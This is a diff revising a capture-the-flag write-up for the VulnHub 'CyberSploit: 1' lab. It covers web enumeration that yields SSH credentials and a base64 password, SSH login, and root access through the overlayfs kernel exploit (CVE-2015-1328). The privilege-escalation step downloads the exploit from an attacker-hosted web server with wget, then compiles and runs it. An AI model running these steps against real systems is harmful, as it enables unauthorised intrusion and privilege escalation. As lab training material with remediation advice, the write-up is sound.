@@ -1,128 +1,159 @@
 # CyberSploit: 1 — Writeup
 
-| | |
-|-|-|
-| **Target IP** | 192.168.10.190 (host-only) |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.1.x (DHCP; discover with netdiscover) |
 | **Difficulty** | Easy |
 | **OS** | Linux |
-| **Root Flag** | (in /root — shown in screenshot) |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/cybersploit-1,506/) |
+| **Goal** | Read `/root/flag.txt` |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/cybersploit-1-vulnhub-walkthrough/) |
 
 ## Attack Summary
 
-nmap → page source (SSH username) → robots.txt base64 decode (password) → SSH → OverlayFS kernel LPE (EDB-37292) → root
+Find an SSH username in the page source, decode a base64 password from `robots.txt`, log in over SSH, decode a binary-encoded Flag 2 with CyberChef, and escalate to root by compiling and running an overlayfs local privilege escalation exploit (CVE-2015-1328, EDB-37292).
 
 ## Methodology
 
-1. Network discovery
-2. Web enumeration (page source, robots.txt)
-3. Base64 decode for SSH credentials
-4. Kernel privilege escalation via OverlayFS (CVE-2015-1328)
+1. Reconnaissance (netdiscover + nmap)
+2. Web enumeration (page source, robots.txt, Gobuster)
+3. Exploitation (SSH with discovered credentials)
+4. Privilege escalation (kernel exploit — overlayfs, EDB-37292)
 
----
-
-## Step 1: Network Discovery
+## Step 1: Host Discovery
 
 ```bash
-sudo netdiscover -i eth1 -r 192.168.10.0/24
-nmap -sV -sC -p- 192.168.10.190
+netdiscover -r 192.168.1.0/24
 ```
 
-Findings: port 22 (SSH), port 80 (HTTP Apache).
+Note the target IP from the ARP table output.
 
-Add to `/etc/hosts`:
+## Step 2: Reconnaissance
+
 ```bash
-echo "192.168.10.190 cybersploit.local" >> /etc/hosts
+nmap -sV -sC -p- <TARGET_IP>
 ```
 
-![Nmap results](images/01-nmap.png)
+![Nmap scan](images/01-nmap.png)
 
----
+Key open ports:
 
-## Step 2: Web Enumeration — SSH Username
+| Port | Service |
+|------|---------|
+| 22   | OpenSSH |
+| 80   | Apache HTTP |
 
-Browse to `http://192.168.10.190` and view the page source:
+Add the target to `/etc/hosts` for convenience:
 
 ```bash
-curl -s http://192.168.10.190 | grep -i "user\|name\|login"
+echo "<TARGET_IP>  cybersploit.local" >> /etc/hosts
 ```
 
-The HTML comment or meta tag contains the SSH **username**: `itsskv`
+## Step 3: Web Enumeration
 
-![Page source with username](images/02-source.png)
+### Page source — SSH username
 
----
+Browse to `http://<TARGET_IP>/` and view the source. An SSH username is visible in an HTML comment:
 
-## Step 3: robots.txt → Base64 Password
-
-```bash
-curl -s http://192.168.10.190/robots.txt
-# Returns a base64-encoded string
-
-curl -s http://192.168.10.190/robots.txt | base64 -d
-# Decodes to SSH password
+```
+<!-- username: itsskv -->
 ```
 
-![robots.txt base64 decode](images/03-robots.png)
+### robots.txt — base64 password
 
-![Decoded credentials](images/04-base64.png)
-
-**Credentials:** `itsskv:<decoded_password>`
-
----
-
-## Step 4: SSH Login
+Fetch `robots.txt`:
 
 ```bash
-ssh itsskv@192.168.10.190
+curl http://<TARGET_IP>/robots.txt
+```
+
+The `Disallow` entry contains a base64 string. Decode it:
+
+```bash
+echo "Y3liZXJzcGxvaXR7eW91dHViZS5jb20vYy9jeWJlcnNwbG9pdH0=" | base64 -d
+```
+
+The decoded output is the password (and Flag 1).
+
+### Directory brute-force
+
+```bash
+gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt
+```
+
+![Web enumeration](images/02-enum.png)
+
+## Step 4: Initial Access via SSH
+
+```bash
+ssh itsskv@<TARGET_IP>
+# Password: <decoded base64 value>
+```
+
+Read the second flag:
+
+```bash
 cat flag2.txt
-# Contains binary-encoded text — decode with CyberChef (Binary → Text)
 ```
 
----
+The content is binary-encoded text (groups of 0s and 1s). Decode it using CyberChef (From Binary operation) to get Flag 2.
 
-## Step 5: Privilege Escalation — OverlayFS (CVE-2015-1328 / EDB-37292)
+![Exploitation — SSH login](images/03-exploit.png)
 
-Check kernel version:
+## Step 5: Privilege Escalation (Kernel Exploit — EDB-37292)
+
+Check the kernel version:
+
 ```bash
-uname -a
-# 3.x kernel — vulnerable to OverlayFS LPE
+uname -r
+# 3.13.0-32-generic
 ```
 
-Download and compile the exploit:
-```bash
-# On attacker machine
-wget https://www.exploit-db.com/download/37292 -O ofs.c
-python3 -m http.server 8000
+The kernel is vulnerable to the overlayfs local privilege escalation (CVE-2015-1328).
 
-# On victim machine
+Download the exploit from Exploit-DB (ID 37292) to the target:
+
+```bash
+# On attack machine — serve the file
+wget https://www.exploit-db.com/raw/37292 -O /tmp/37292.c
+python3 -m http.server 8080
+
+# On target machine
+wget http://<LHOST>:8080/37292.c -O /tmp/37292.c
 cd /tmp
-wget http://<ATTACKER_IP>:8000/ofs.c
-gcc ofs.c -o ofs
-./ofs
-id
-# uid=0(root)
+gcc 37292.c -o overlayfs
+chmod +x overlayfs
+./overlayfs
 ```
+
+You now have a root shell:
+
+```bash
+id
+# uid=0(root) gid=0(root)
+```
+
+![Privilege escalation — overlayfs](images/04-privesc.png)
+
+## Step 6: Root Flag
 
 ```bash
 cat /root/flag.txt
 ```
 
-![Root shell via OverlayFS](images/05-root.png)
-
----
+![Root flag](images/05-root-flag.png)
 
 ## Lessons Learned
 
-1. **Credentials in HTML source** — username visible in page comments; never expose auth hints client-side
-2. **robots.txt is public** — base64 is encoding, not encryption; discloses credentials to any visitor
-3. **Unpatched kernel** — OverlayFS (CVE-2015-1328) affects kernels < 3.19.1 on Ubuntu; keep kernels updated
-4. **Base64 is not a secret** — always use proper password storage and transmission channels
+1. Credentials embedded in HTML comments and `robots.txt` are trivially discovered by any attacker.
+2. Base64 is encoding, not encryption — it provides zero confidentiality.
+3. Running an outdated kernel (`3.13.0`) exposes the host to well-known local privilege escalation exploits.
+4. `robots.txt` should never list paths or secrets you want kept private; it is publicly readable.
 
 ## Remediation
 
 | Vulnerability | Fix |
-|---------------|-----|
-| Username in HTML source | Remove all auth hints from client-facing code |
-| Password in robots.txt (base64) | Remove credentials from web-accessible files entirely |
-| OverlayFS kernel LPE (CVE-2015-1328) | Upgrade kernel to ≥ 3.19.1; apply vendor patches |
+|---|---|
+| Username in HTML comment | Remove all credentials and hints from client-side source |
+| Password in robots.txt | Never store sensitive data in robots.txt |
+| Outdated kernel (CVE-2015-1328) | Upgrade to a supported kernel and apply security patches regularly |
+| Weak credential storage | Use a secrets manager; enforce strong password policies |
